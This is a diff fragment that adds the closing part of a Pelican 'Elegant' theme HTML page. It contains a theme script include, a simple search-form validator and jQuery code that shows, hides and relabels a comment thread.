+        <script src="/theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
